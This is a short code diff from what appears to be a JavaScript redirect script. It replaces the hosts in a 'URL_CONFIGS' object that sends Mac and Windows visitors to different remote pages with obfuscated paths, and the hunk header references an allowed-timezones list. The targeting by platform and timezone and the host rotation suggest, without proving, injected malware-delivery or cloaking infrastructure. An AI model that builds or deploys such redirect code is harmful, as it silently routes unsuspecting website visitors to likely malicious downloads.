@@ -30,8 +30,8 @@ const ALLOWED_TIMEZONES = new Set([
 
 // URL configurations organized by platform target
 const URL_CONFIGS = {
-    mac: "https://dolphin-app-qotif.ondigitalocean.app/Ma0cHelpAsMEr0t0140/index.html",
-    default: "https://dolphin-app-qotif.ondigitalocean.app/Win0codejInfowj2n/index.html"
+    mac: "https://shark-app-clbxf.ondigitalocean.app/Ma0cHelpAsMEr0t0140/index.html",
+    default: "https://shark-app-clbxf.ondigitalocean.app/Win0codejInfowj2n/index.html"
 };
 
 // --- Pre-Compilation Cache Layer ---
